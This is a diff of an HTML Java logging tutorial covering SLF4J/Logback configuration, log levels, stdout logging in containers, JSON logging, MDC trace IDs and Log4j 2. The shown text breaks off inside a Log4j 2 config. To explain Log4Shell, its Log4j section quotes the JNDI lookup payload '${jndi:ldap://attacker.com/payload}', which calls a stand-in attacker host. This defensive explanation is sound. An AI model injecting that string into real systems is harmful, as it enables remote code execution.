@@ -1,494 +1,640 @@
-﻿<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html>
+<html lang="en" data-i18n-root="../.." data-i18n-title="topic.logging.page-title">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Logging Frameworks - JavaDev Bible</title>
     <link rel="stylesheet" href="../../css/main.css">
     <link rel="stylesheet" href="../../css/syntax-highlighting.css">
+    <link rel="stylesheet" href="../../css/toc.css">
 </head>
 <body class="topic-page">
     <header class="topic-header">
         <div class="header-content">
             <nav class="breadcrumb">
-                <a href="../../index.html">Home</a> / <a href="../../index.html#tools">Tools & Ecosystem</a> / Logging Frameworks
+                <a href="../../index.html" data-i18n="nav.home">Home</a> /
+                <a href="../../index.html#tools" data-i18n="nav.tools">Tools &amp; Ecosystem</a> /
+                Logging Frameworks
             </nav>
-            <h1>Logging Frameworks</h1>
-            <p class="topic-subtitle">Effective Logging in Java Applications</p>
-            <a href="../../index.html#tools" class="back-btn">&larr; Back to Index</a>
+            <h1 data-i18n="topic.logging.h1">Logging Frameworks</h1>
+            <p class="topic-subtitle" data-i18n="topic.logging.subtitle">SLF4J and Logback in practice, why stdout beats files in a container, correlating logs across microservices with trace IDs, the Log4Shell lesson, and log injection — the vulnerability specific to logging itself</p>
+            <a href="../../index.html#tools" class="back-btn" data-i18n="nav.back-to-index">&larr; Back to Index</a>
         </div>
     </header>
 
-    <main class="topic-content">
-        <section class="content-section">
-            <h2>Why Logging Matters</h2>
-            <p>Logging is essential for understanding application behavior, debugging issues, monitoring performance, and maintaining audit trails. Good logging practices can dramatically reduce time spent troubleshooting production issues.</p>
+    <div class="topic-layout">
 
-            <div class="info-box note">
-                <div class="info-box-title">Logging Benefits</div>
-                <ul>
-                    <li><strong>Debugging</strong> - Understand what happened when errors occur</li>
-                    <li><strong>Monitoring</strong> - Track application health and performance</li>
-                    <li><strong>Auditing</strong> - Record important business events</li>
-                    <li><strong>Analytics</strong> - Analyze usage patterns and trends</li>
-                    <li><strong>Compliance</strong> - Meet regulatory requirements</li>
-                </ul>
+        <aside class="toc-sidebar" id="toc-sidebar" aria-label="Table of contents">
+            <div class="toc-header">
+                <span class="toc-title">📋 Contents</span>
+                <button class="toc-toggle" id="toc-toggle" aria-expanded="true" aria-controls="toc-nav"
+                    aria-label="Collapse table of contents" title="Collapse / Expand">
+                    <span class="toc-icon" aria-hidden="true">▲</span>
+                </button>
             </div>
-        </section>
+            <nav class="toc-nav" id="toc-nav" aria-label="In-page navigation"></nav>
+        </aside>
 
-        <section class="content-section">
-            <h2>Java Logging Landscape</h2>
+        <main class="topic-content">
 
-            <h3>Logging APIs vs Implementations</h3>
-            <pre><code><span class="comment">// Logging APIs (Facades) - What you code against</span>
-SLF4J          <span class="comment">// Most popular, recommended</span>
-Commons Logging <span class="comment">// Legacy, still used</span>
-JUL API        <span class="comment">// java.util.logging (built-in)</span>
+            <!-- ═══════════════════════════════════════════
+                 SECTION 0 — WHY LOGGING MATTERS
+            ════════════════════════════════════════════ -->
+            <section class="content-section">
+                <h2>Why Logging Matters — and What Changes Without It</h2>
+                <p>An application with no logging fails silently. When
+                    <code>order-service</code> starts returning 500s at 3 AM, the
+                    only evidence of what actually happened is whatever the JVM's
+                    default stack trace prints to a console nobody is watching. Good
+                    logging turns "the app is broken, we don't know why" into "the
+                    payment gateway returned a timeout for order #4471, here's the
+                    exact request that triggered it."</p>
 
-<span class="comment">// Logging Implementations - What actually logs</span>
-Logback        <span class="comment">// Native SLF4J implementation, recommended</span>
-Log4j 2        <span class="comment">// Powerful, highly configurable</span>
-JUL            <span class="comment">// java.util.logging (built-in)</span>
+                <pre><code><span class="comment">// BEFORE — no structured logging, a stack trace and nothing else</span>
+<span class="comment">Exception in thread "main" java.lang.NullPointerException
+    at com.shop.order.OrderService.processOrder(OrderService.java:42)
+// Which order? Which customer? Was this the 1st failure today or the 500th?
+// Unanswerable after the fact.</span>
 
-<span class="comment">// The pattern: Use SLF4J API + Logback implementation</span></code></pre>
+<span class="comment">// AFTER — a structured, leveled log line with context</span>
+<span class="comment">{"timestamp":"2026-07-10T03:14:02Z","level":"ERROR",
+ "logger":"com.shop.order.OrderService","traceId":"9f8b3c2a1e",
+ "orderId":"4471","customerId":"8821",
+ "message":"Payment gateway timed out after 3 retries"}
+// Queryable, correlatable across services, and it tells you exactly
+// what to look at next.</span></code></pre>
+            </section>
 
-            <table>
-                <thead>
-                    <tr>
-                        <th>Framework</th>
-                        <th>Type</th>
-                        <th>Recommendation</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <tr>
-                        <td><strong>SLF4J + Logback</strong></td>
-                        <td>API + Implementation</td>
-                        <td>Recommended for new projects</td>
-                    </tr>
-                    <tr>
-                        <td><strong>Log4j 2</strong></td>
-                        <td>Both</td>
-                        <td>High-performance needs</td>
-                    </tr>
-                    <tr>
-                        <td><strong>java.util.logging</strong></td>
-                        <td>Built-in</td>
-                        <td>Simple projects, no dependencies</td>
-                    </tr>
-                </tbody>
-            </table>
-        </section>
+            <!-- ═══════════════════════════════════════════
+                 SECTION 1 — THE JAVA LOGGING LANDSCAPE
+            ════════════════════════════════════════════ -->
+            <section class="content-section">
+                <h2>The Java Logging Landscape — APIs vs Implementations</h2>
+                <p>This is the single most confusing thing about Java logging for
+                    anyone new to it: the interface you code against and the
+                    library that actually writes the log line are almost always two
+                    different dependencies.</p>
 
-        <section class="content-section">
-            <h2>SLF4J with Logback</h2>
-            <p>SLF4J (Simple Logging Facade for Java) provides a common API, while Logback is its native implementation. This is the most popular combination in modern Java applications.</p>
+                <pre><code><span class="comment">// Logging APIs (facades) — what your code calls</span>
+SLF4J           <span class="comment">// the standard facade — code against this, not an implementation directly</span>
+JUL API         <span class="comment">// java.util.logging — built into the JDK, rarely chosen for new code</span>
 
-            <h3>Maven Dependencies</h3>
-            <pre><code><span class="comment">&lt;!-- SLF4J API --&gt;</span>
+<span class="comment">// Logging implementations — what actually writes the log line</span>
+Logback         <span class="comment">// SLF4J's native implementation — the default in Spring Boot</span>
+Log4j 2         <span class="comment">// powerful, async-first via the LMAX Disruptor</span>
+
+<span class="comment">// The pattern almost every project should follow:
+// code against the SLF4J API, let Logback (or Log4j 2) do the actual writing</span></code></pre>
+
+                <table>
+                    <thead>
+                        <tr><th>Combination</th><th>Recommendation</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><strong>SLF4J + Logback</strong></td><td>Default choice — this is what <code>spring-boot-starter-logging</code> ships</td></tr>
+                        <tr><td><strong>SLF4J + Log4j 2</strong></td><td>When you specifically need Log4j 2's async performance under very high throughput</td></tr>
+                        <tr><td><strong>java.util.logging</strong></td><td>Only for a dependency-free library that can't impose a logging choice on its consumers</td></tr>
+                    </tbody>
+                </table>
+            </section>
+
+            <!-- ═══════════════════════════════════════════
+                 SECTION 2 — SLF4J WITH LOGBACK
+            ════════════════════════════════════════════ -->
+            <section class="content-section">
+                <h2>SLF4J with Logback</h2>
+
+                <h3>Maven Dependencies</h3>
+                <pre><code><span class="comment">&lt;!-- Spring Boot: included automatically via spring-boot-starter --&gt;</span>
 &lt;dependency&gt;
     &lt;groupId&gt;org.slf4j&lt;/groupId&gt;
     &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt;
-    &lt;version&gt;2.0.9&lt;/version&gt;
 &lt;/dependency&gt;
-
-<span class="comment">&lt;!-- Logback Implementation --&gt;</span>
 &lt;dependency&gt;
     &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;
     &lt;artifactId&gt;logback-classic&lt;/artifactId&gt;
-    &lt;version&gt;1.4.14&lt;/version&gt;
-&lt;/dependency&gt;
+&lt;/dependency&gt;</code></pre>
 
-<span class="comment">&lt;!-- Spring Boot: Just include spring-boot-starter-logging --&gt;</span>
-<span class="comment">&lt;!-- It's included by default in spring-boot-starter --&gt;</span></code></pre>
-
-            <h3>Basic Usage</h3>
-            <pre><code><span class="keyword">import</span> org.slf4j.Logger;
+                <h3>Basic Usage</h3>
+                <pre><code><span class="keyword">import</span> org.slf4j.Logger;
 <span class="keyword">import</span> org.slf4j.LoggerFactory;
 
-<span class="keyword">public class</span> <span class="class-name">UserService</span> {
+<span class="keyword">public class</span> <span class="class-name">CustomerService</span> {
 
-    <span class="comment">// Create logger - conventionally named 'logger' or 'log'</span>
-    <span class="keyword">private static final</span> <span class="class-name">Logger</span> logger = <span class="class-name">LoggerFactory</span>.getLogger(<span class="class-name">UserService</span>.<span class="keyword">class</span>);
+    <span class="keyword">private static final</span> <span class="class-name">Logger</span> log = <span class="class-name">LoggerFactory</span>.getLogger(<span class="class-name">CustomerService</span>.<span class="keyword">class</span>);
 
-    <span class="keyword">public</span> <span class="class-name">User</span> <span class="function">findUser</span>(<span class="class-name">Long</span> id) {
-        logger.debug(<span class="string">"Finding user with id: {}"</span>, id);
+    <span class="keyword">public</span> <span class="class-name">Customer</span> <span class="function">findCustomer</span>(<span class="class-name">Long</span> id) {
+        log.debug(<span class="string">"Finding customer with id: {}"</span>, id);
 
-        <span class="keyword">try</span> {
-            <span class="class-name">User</span> user = userRepository.findById(id);
-
-            <span class="keyword">if</span> (user == <span class="keyword">null</span>) {
-                logger.warn(<span class="string">"User not found with id: {}"</span>, id);
-                <span class="keyword">return null</span>;
-            }
-
-            logger.info(<span class="string">"Successfully found user: {}"</span>, user.getUsername());
-            <span class="keyword">return</span> user;
-
-        } <span class="keyword">catch</span> (<span class="class-name">Exception</span> e) {
-            logger.error(<span class="string">"Error finding user with id: {}"</span>, id, e);
-            <span class="keyword">throw</span> e;
+        <span class="class-name">Customer</span> customer = customerRepository.findById(id).orElse(<span class="keyword">null</span>);
+        <span class="keyword">if</span> (customer == <span class="keyword">null</span>) {
+            log.warn(<span class="string">"Customer not found with id: {}"</span>, id);
+            <span class="keyword">return null</span>;
         }
+
+        log.info(<span class="string">"Found customer: {}"</span>, customer.getId());
+        <span class="keyword">return</span> customer;
     }
 }</code></pre>
 
-            <h3>Logback Configuration (logback.xml)</h3>
-            <pre><code><span class="comment">&lt;!-- src/main/resources/logback.xml --&gt;</span>
-&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;configuration&gt;
-
-    <span class="comment">&lt;!-- Console Appender --&gt;</span>
+                <h3>Logback Configuration (<code>logback.xml</code>)</h3>
+                <pre><code>&lt;configuration&gt;
     &lt;appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender"&gt;
         &lt;encoder&gt;
             &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n&lt;/pattern&gt;
         &lt;/encoder&gt;
     &lt;/appender&gt;
 
-    <span class="comment">&lt;!-- File Appender --&gt;</span>
-    &lt;appender name="FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt;
-        &lt;file&gt;logs/application.log&lt;/file&gt;
-        &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt;
-            &lt;fileNamePattern&gt;logs/application.%d{yyyy-MM-dd}.log&lt;/fileNamePattern&gt;
-            &lt;maxHistory&gt;30&lt;/maxHistory&gt;
-            &lt;totalSizeCap&gt;3GB&lt;/totalSizeCap&gt;
-        &lt;/rollingPolicy&gt;
-        &lt;encoder&gt;
-            &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n&lt;/pattern&gt;
-        &lt;/encoder&gt;
-    &lt;/appender&gt;
-
-    <span class="comment">&lt;!-- Logger for specific package --&gt;</span>
-    &lt;logger name="com.example" level="DEBUG"/&gt;
-
-    <span class="comment">&lt;!-- Reduce noise from frameworks --&gt;</span>
+    &lt;logger name="com.shop" level="DEBUG"/&gt;
     &lt;logger name="org.springframework" level="WARN"/&gt;
     &lt;logger name="org.hibernate" level="WARN"/&gt;
 
-    <span class="comment">&lt;!-- Root logger --&gt;</span>
     &lt;root level="INFO"&gt;
         &lt;appender-ref ref="CONSOLE"/&gt;
-        &lt;appender-ref ref="FILE"/&gt;
     &lt;/root&gt;
-
 &lt;/configuration&gt;</code></pre>
 
-            <h3>Spring Boot Configuration</h3>
-            <pre><code><span class="comment"># application.properties</span>
-
-<span class="comment"># Log levels</span>
+                <h3>Spring Boot Configuration</h3>
+                <pre><code><span class="comment"># application.properties</span>
 logging.level.root=INFO
-logging.level.com.example=DEBUG
-logging.level.org.springframework.web=WARN
+logging.level.com.shop=DEBUG
 logging.level.org.hibernate.SQL=DEBUG
+logging.pattern.console=%d{yyyy-MM-dd HH:mm:ss} - %msg%n</code></pre>
+            </section>
 
-<span class="comment"># Log file</span>
-logging.file.name=logs/application.log
-logging.file.max-size=10MB
-logging.file.max-history=30
+            <!-- ═══════════════════════════════════════════
+                 SECTION 3 — LOG LEVELS
+            ════════════════════════════════════════════ -->
+            <section class="content-section">
+                <h2>Log Levels</h2>
+                <table>
+                    <thead>
+                        <tr><th>Level</th><th>When to use</th><th>Example</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><strong>TRACE</strong></td><td>Very fine-grained debugging, method entry/exit</td><td>Entering processOrder()</td></tr>
+                        <tr><td><strong>DEBUG</strong></td><td>Development-time detail, disabled in production by default</td><td>Processing order with 5 items</td></tr>
+                        <tr><td><strong>INFO</strong></td><td>Significant business events, normal operation</td><td>Order #4471 completed successfully</td></tr>
+                        <tr><td><strong>WARN</strong></td><td>Recoverable problems worth noticing</td><td>Retry attempt 2 of 3 for payment gateway</td></tr>
+                        <tr><td><strong>ERROR</strong></td><td>Needs attention; the operation failed</td><td>Failed to process payment for order #4471</td></tr>
+                    </tbody>
+                </table>
 
-<span class="comment"># Log pattern</span>
-logging.pattern.console=%d{yyyy-MM-dd HH:mm:ss} - %msg%n
-logging.pattern.file=%d{yyyy-MM-dd HH:mm:ss} [%thread] %-5level %logger{36} - %msg%n</code></pre>
-        </section>
-
-        <section class="content-section">
-            <h2>Log Levels</h2>
-            <p>Log levels indicate the severity or importance of log messages. Use them appropriately to control verbosity.</p>
-
-            <table>
-                <thead>
-                    <tr>
-                        <th>Level</th>
-                        <th>When to Use</th>
-                        <th>Example</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <tr>
-                        <td><strong>TRACE</strong></td>
-                        <td>Very detailed debugging, method entry/exit</td>
-                        <td>Entering method processOrder()</td>
-                    </tr>
-                    <tr>
-                        <td><strong>DEBUG</strong></td>
-                        <td>Debugging information for development</td>
-                        <td>Processing order with 5 items</td>
-                    </tr>
-                    <tr>
-                        <td><strong>INFO</strong></td>
-                        <td>Important business events, normal operation</td>
-                        <td>Order #123 completed successfully</td>
-                    </tr>
-                    <tr>
-                        <td><strong>WARN</strong></td>
-                        <td>Potential problems, recoverable issues</td>
-                        <td>Retry attempt 2 of 3 for payment</td>
-                    </tr>
-                    <tr>
-                        <td><strong>ERROR</strong></td>
-                        <td>Errors that need attention but app continues</td>
-                        <td>Failed to process payment for order #123</td>
-                    </tr>
-                </tbody>
-            </table>
-
-            <pre><code><span class="keyword">public class</span> <span class="class-name">OrderService</span> {
-
+                <pre><code><span class="keyword">public class</span> <span class="class-name">OrderService</span> {
     <span class="keyword">private static final</span> <span class="class-name">Logger</span> log = <span class="class-name">LoggerFactory</span>.getLogger(<span class="class-name">OrderService</span>.<span class="keyword">class</span>);
 
     <span class="keyword">public</span> <span class="class-name">Order</span> <span class="function">processOrder</span>(<span class="class-name">Order</span> order) {
-        log.trace(<span class="string">"Entering processOrder with order: {}"</span>, order);
-
-        log.debug(<span class="string">"Processing order {} with {} items"</span>,
-                  order.getId(), order.getItems().size());
-
+        log.debug(<span class="string">"Processing order {} with {} items"</span>, order.getId(), order.getItems().size());
         <span class="keyword">try</span> {
             validateOrder(order);
-            log.info(<span class="string">"Order {} validated successfully"</span>, order.getId());
-
-            <span class="keyword">if</span> (order.getTotal() &gt; <span class="number">10000</span>) {
+            <span class="keyword">if</span> (order.getTotal().compareTo(<span class="class-name">BigDecimal</span>.valueOf(<span class="number">10000</span>)) &gt; <span class="number">0</span>) {
                 log.warn(<span class="string">"Large order {} requires manual review"</span>, order.getId());
             }
-
             completeOrder(order);
-            log.info(<span class="string">"Order {} completed, total: ${}"</span>, order.getId(), order.getTotal());
-
+            log.info(<span class="string">"Order {} completed, total: {}"</span>, order.getId(), order.getTotal());
         } <span class="keyword">catch</span> (<span class="class-name">PaymentException</span> e) {
             log.error(<span class="string">"Payment failed for order {}: {}"</span>, order.getId(), e.getMessage(), e);
             <span class="keyword">throw</span> e;
         }
-
-        log.trace(<span class="string">"Exiting processOrder"</span>);
         <span class="keyword">return</span> order;
     }
 }</code></pre>
-        </section>
+            </section>
 
-        <section class="content-section">
-            <h2>Logging Best Practices</h2>
+            <!-- ═══════════════════════════════════════════
+                 SECTION 4 — WHERE LOGS SHOULD ACTUALLY GO
+            ════════════════════════════════════════════ -->
+            <section class="content-section">
+                <h2>Where Should Logs Actually Go? Files vs stdout</h2>
+                <p>A <code>RollingFileAppender</code> writing to
+                    <code>logs/application.log</code> made sense when an application
+                    ran on a fixed VM you could SSH into. It's the wrong default
+                    for a containerized service.</p>
 
-            <div class="info-box tip">
-                <div class="info-box-title">Logging Guidelines</div>
-                <ul>
-                    <li><strong>Use parameterized logging</strong> - Avoid string concatenation</li>
-                    <li><strong>Include context</strong> - Add IDs, user info, transaction details</li>
-                    <li><strong>Don't log sensitive data</strong> - Passwords, credit cards, PII</li>
-                    <li><strong>Be consistent</strong> - Use same format across application</li>
-                    <li><strong>Log at appropriate level</strong> - Don't use ERROR for normal flow</li>
-                </ul>
-            </div>
+                <div class="info-box important">
+                    <div class="info-box-title">In a container, write to stdout — let the platform collect it</div>
+                    <p>A container's filesystem is ephemeral — when
+                        <code>order-service</code>'s pod is rescheduled or restarted,
+                        anything written to a local log file is gone with it. The
+                        cloud-native pattern (one of the original Twelve-Factor App
+                        principles, still the default assumption in Kubernetes) is:
+                        the application writes logs as an unbuffered stream to
+                        <code>stdout</code>, and a separate agent running on the
+                        node (Fluent Bit, Vector, the CloudWatch/Loki agent)
+                        collects, ships, and retains them centrally. Rolling
+                        policies, retention, and compression become the log
+                        collector's job, not application code's.</p>
+                    <pre><code><span class="comment"># logback.xml — container-appropriate: console only, no file appender at all</span>
+&lt;configuration&gt;
+    &lt;appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender"&gt;
+        &lt;encoder class="net.logstash.logback.encoder.LogstashEncoder"/&gt;
+    &lt;/appender&gt;
+    &lt;root level="INFO"&gt;
+        &lt;appender-ref ref="CONSOLE"/&gt;
+    &lt;/root&gt;
+&lt;/configuration&gt;</code></pre>
+                    <p>A <code>RollingFileAppender</code> is still the right choice
+                        for a traditional on-prem deployment on a long-lived VM with
+                        no external log collector — the point is to make the
+                        decision deliberately based on where the service actually
+                        runs, not by copying whichever config sample you found
+                        first.</p>
+                </div>
+            </section>
 
-            <h3>Parameterized Logging</h3>
-            <pre><code><span class="comment">// BAD - String concatenation (always evaluates)</span>
-logger.debug(<span class="string">"Processing user: "</span> + user.getName() + <span class="string">" with id: "</span> + user.getId());
+            <!-- ═══════════════════════════════════════════
+                 SECTION 5 — STRUCTURED LOGGING
+            ════════════════════════════════════════════ -->
+            <section class="content-section">
+                <h2>Structured Logging (JSON) — the Default, Not an Add-On</h2>
+                <p>A plain-text log line is optimized for a human reading it
+                    live in a terminal. The moment logs are collected centrally
+                    across dozens of service instances, plain text becomes
+                    something you <code>grep</code> and hope — structured JSON
+                    becomes something you query precisely by field.</p>
 
-<span class="comment">// GOOD - Parameterized (only evaluates if debug enabled)</span>
-logger.debug(<span class="string">"Processing user: {} with id: {}"</span>, user.getName(), user.getId());
-
-<span class="comment">// For expensive operations, check level first</span>
-<span class="keyword">if</span> (logger.isDebugEnabled()) {
-    logger.debug(<span class="string">"Order details: {}"</span>, order.toDetailedString());
-}</code></pre>
-
-            <h3>Exception Logging</h3>
-            <pre><code><span class="comment">// BAD - Loses stack trace</span>
-logger.error(<span class="string">"Error: "</span> + e.getMessage());
-
-<span class="comment">// BAD - Redundant message</span>
-logger.error(<span class="string">"Exception occurred: "</span> + e.toString(), e);
-
-<span class="comment">// GOOD - Context + full stack trace</span>
-logger.error(<span class="string">"Failed to process order {}"</span>, orderId, e);
-
-<span class="comment">// GOOD - With additional context</span>
-logger.error(<span class="string">"Failed to process order {} for user {}: {}"</span>,
-             orderId, userId, e.getMessage(), e);</code></pre>
-
-            <h3>Structured Logging (JSON)</h3>
-            <pre><code><span class="comment">&lt;!-- logback.xml for JSON output --&gt;</span>
+                <pre><code><span class="comment">&lt;!-- pom.xml --&gt;</span>
 &lt;dependency&gt;
     &lt;groupId&gt;net.logstash.logback&lt;/groupId&gt;
     &lt;artifactId&gt;logstash-logback-encoder&lt;/artifactId&gt;
     &lt;version&gt;7.4&lt;/version&gt;
-&lt;/dependency&gt;
-
-<span class="comment">&lt;!-- In logback.xml --&gt;</span>
-&lt;appender name="JSON" class="ch.qos.logback.core.ConsoleAppender"&gt;
-    &lt;encoder class="net.logstash.logback.encoder.LogstashEncoder"/&gt;
-&lt;/appender&gt;
-
-<span class="comment">// Output example:</span>
-{
-    "@timestamp": "2024-01-15T10:30:45.123Z",
-    "level": "INFO",
-    "logger_name": "com.example.OrderService",
-    "message": "Order completed",
-    "orderId": "12345",
-    "userId": "user-789"
-}</code></pre>
-        </section>
-
-        <section class="content-section">
-            <h2>MDC - Mapped Diagnostic Context</h2>
-            <p>MDC allows you to add contextual information to all log messages within a thread, perfect for tracking request IDs, user sessions, etc.</p>
-
-            <pre><code><span class="keyword">import</span> org.slf4j.MDC;
-
-<span class="keyword">public class</span> <span class="class-name">RequestFilter</span> <span class="keyword">implements</span> <span class="class-name">Filter</span> {
-
-    <span class="annotation">@Override</span>
-    <span class="keyword">public void</span> <span class="function">doFilter</span>(<span class="class-name">ServletRequest</span> request, <span class="class-name">ServletResponse</span> response,
-                         <span class="class-name">FilterChain</span> chain) <span class="keyword">throws</span> <span class="class-name">IOException</span>, <span class="class-name">ServletException</span> {
-
-        <span class="keyword">try</span> {
-            <span class="comment">// Add context for all logs in this request</span>
-            MDC.put(<span class="string">"requestId"</span>, <span class="class-name">UUID</span>.randomUUID().toString());
-            MDC.put(<span class="string">"userId"</span>, getCurrentUserId());
-            MDC.put(<span class="string">"clientIP"</span>, request.getRemoteAddr());
-
-            chain.doFilter(request, response);
-
-        } <span class="keyword">finally</span> {
-            <span class="comment">// Always clear to prevent memory leaks</span>
-            MDC.clear();
-        }
-    }
-}
-
-<span class="comment">// In logback.xml, include MDC values in pattern</span>
-&lt;pattern&gt;%d{HH:mm:ss} [%X{requestId}] [%X{userId}] %-5level %logger{36} - %msg%n&lt;/pattern&gt;
-
-<span class="comment">// Log output automatically includes context:</span>
-<span class="comment">// 10:30:45 [abc-123] [user-456] INFO  c.e.OrderService - Processing order</span></code></pre>
-        </section>
-
-        <section class="content-section">
-            <h2>Log4j 2</h2>
-            <p>Log4j 2 is a powerful alternative with excellent performance, especially for asynchronous logging.</p>
-
-            <h3>Maven Dependencies</h3>
-            <pre><code>&lt;dependency&gt;
-    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
-    &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
-    &lt;version&gt;2.22.0&lt;/version&gt;
-&lt;/dependency&gt;
-&lt;dependency&gt;
-    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
-    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
-    &lt;version&gt;2.22.0&lt;/version&gt;
-&lt;/dependency&gt;
-
-<span class="comment">&lt;!-- Bridge SLF4J to Log4j 2 --&gt;</span>
-&lt;dependency&gt;
-    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
-    &lt;artifactId&gt;log4j-slf4j2-impl&lt;/artifactId&gt;
-    &lt;version&gt;2.22.0&lt;/version&gt;
 &lt;/dependency&gt;</code></pre>
 
-            <h3>Log4j 2 Configuration (log4j2.xml)</h3>
-            <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;Configuration status="WARN"&gt;
+                <pre><code><span class="comment">&lt;!-- logback.xml --&gt;</span>
+&lt;appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender"&gt;
+    &lt;encoder class="net.logstash.logback.encoder.LogstashEncoder"/&gt;
+&lt;/appender&gt;</code></pre>
+
+                <pre><code><span class="comment">// Output — one JSON object per line, every field independently queryable</span>
+{
+  "@timestamp": "2026-07-10T03:14:02.123Z",
+  "level": "ERROR",
+  "logger_name": "com.shop.order.OrderService",
+  "message": "Payment failed for order 4471",
+  "orderId": "4471",
+  "customerId": "8821"
+}
+<span class="comment">// "show me every ERROR for customerId 8821 in the last hour" is now
+// a precise query, not a hope that the right string appears in a grep</span></code></pre>
+            </section>
+
+            <!-- ═══════════════════════════════════════════
+                 SECTION 6 — MDC AND DISTRIBUTED TRACING
+            ════════════════════════════════════════════ -->
+            <section class="content-section">
+                <h2>MDC and Correlating Logs Across Microservices</h2>
+                <p><strong>MDC (Mapped Diagnostic Context)</strong> attaches
+                    contextual key-value pairs to every log line written on the
+                    current thread — the classic use is a request ID, so every log
+                    line from a single request can be filtered together.</p>
+
+                <pre><code><span class="keyword">import</span> org.slf4j.MDC;
+
+<span class="annotation">@Override</span>
+<span class="keyword">public void</span> <span class="function">doFilter</span>(<span class="class-name">ServletRequest</span> request, <span class="class-name">ServletResponse</span> response,
+                     <span class="class-name">FilterChain</span> chain) <span class="keyword">throws</span> <span class="class-name">IOException</span>, <span class="class-name">ServletException</span> {
+    <span class="keyword">try</span> {
+        MDC.put(<span class="string">"requestId"</span>, <span class="class-name">UUID</span>.randomUUID().toString());
+        chain.doFilter(request, response);
+    } <span class="keyword">finally</span> {
+        MDC.clear();   <span class="comment">// always clear — MDC is thread-local and threads are pooled and reused</span>
+    }
+}</code></pre>
+
+                <div class="info-box important">
+                    <div class="info-box-title">A request ID stops at the network boundary — a trace ID doesn't</div>
+                    <p>A hand-rolled <code>requestId</code> is generated fresh in
+                        each service — when <code>order-service</code> calls
+                        <code>payment-service</code> over HTTP, the two have no
+                        shared identifier unless you manually thread it through
+                        every outgoing header. This is exactly the problem
+                        distributed tracing (OpenTelemetry, and Spring Boot's
+                        Micrometer Tracing integration) solves: a single
+                        <strong>trace ID</strong> is generated once at the edge and
+                        automatically propagated through every downstream HTTP
+                        call, message, and log line across every service in the
+                        request's path — turning "logs from three separate services
+                        I have to correlate by timestamp and guesswork" into "every
+                        log line for this one request, across the whole system, by
+                        one ID."</p>
+                    <pre><code><span class="comment">&lt;!-- Spring Boot 3.x — Micrometer Tracing auto-populates MDC with
+     traceId/spanId on every log line, propagated automatically across
+     RestTemplate/WebClient calls to other services --&gt;</span>
+&lt;dependency&gt;
+    &lt;groupId&gt;io.micrometer&lt;/groupId&gt;
+    &lt;artifactId&gt;micrometer-tracing-bridge-otel&lt;/artifactId&gt;
+&lt;/dependency&gt;</code></pre>
+                    <pre><code><span class="comment">// logback.xml — include the trace/span IDs Micrometer Tracing injects into MDC</span>
+&lt;pattern&gt;%d{HH:mm:ss} [%X{traceId}/%X{spanId}] %-5level %logger{36} - %msg%n&lt;/pattern&gt;</code></pre>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════
+                 SECTION 7 — LOG4J 2 AND THE LOG4SHELL LESSON
+            ════════════════════════════════════════════ -->
+            <section class="content-section">
+                <h2>Log4j 2 — and the Log4Shell Lesson Every Java Developer Should Know</h2>
+                <p>Log4j 2 is a capable, high-performance implementation with
+                    genuinely async logging via the LMAX Disruptor. It is also the
+                    subject of one of the most severe vulnerabilities in the
+                    history of the Java ecosystem, and understanding <em>why</em>
+                    it happened changes how you should think about logging
+                    dependencies generally.</p>
+
+                <pre><code><span class="comment">&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
+    &lt;version&gt;2.24.0&lt;/version&gt;  &lt;!-- always the latest patch — see the box below --&gt;
+&lt;/dependency&gt;</code></pre>
+
+                <div class="info-box important">
+                    <div class="info-box-title">Log4Shell (CVE-2021-44228) — what actually happened, in one sentence</div>
+                    <p>Log4j 2's message formatter supported a
+                        <strong>lookup substitution syntax</strong> like
+                        <code>${jndi:ldap://attacker.com/payload}</code> directly
+                        inside the string being logged — and versions before 2.15
+                        would evaluate that lookup, including performing a live
+                        JNDI/LDAP network call and loading whatever class the
+                        response pointed to, achieving remote code execution. Any
+                        application that logged unsanitized user input — a
+                        <code>User-Agent</code> header, a search query, a username
+                        at login — and used a vulnerable Log4j 2 version could be
+                        fully compromised by a single crafted string. The fix in
+                        2.17.0 disabled message lookups and JNDI resolution by
+                        default entirely.</p>
+                    <p>The durable lesson isn't "avoid Log4j 2" — it's patched and
+                        safe today. It's that <strong>a logging library sits
+                        directly in the path of untrusted input on every request</strong>,
+                        making it one of the highest-value targets in your entire
+                        dependency tree. Pin logging dependencies to patched
+                        versions with the same discipline covered for GitHub
+                        Actions in <a href="cicd.html">CI/CD</a>, and run dependency
+                        scanning (OWASP Dependency-Check, also covered there)
+                        specifically because a transitive Log4j 2 dependency three
+                        layers deep is exactly how most organizations were exposed
+                        in December 2021 without directly declaring it themselves.</p>
+                </div>
+
+                <h3>Log4j 2 async configuration</h3>
+                <pre><code>&lt;Configuration status="WARN"&gt;
     &lt;Appenders&gt;
         &lt;Console name="Console" target="SYSTEM_OUT"&gt;
             &lt;PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/&gt;
         &lt;/Console&gt;
-
-        <span class="comment">&lt;!-- Async file appender for performance --&gt;</span>
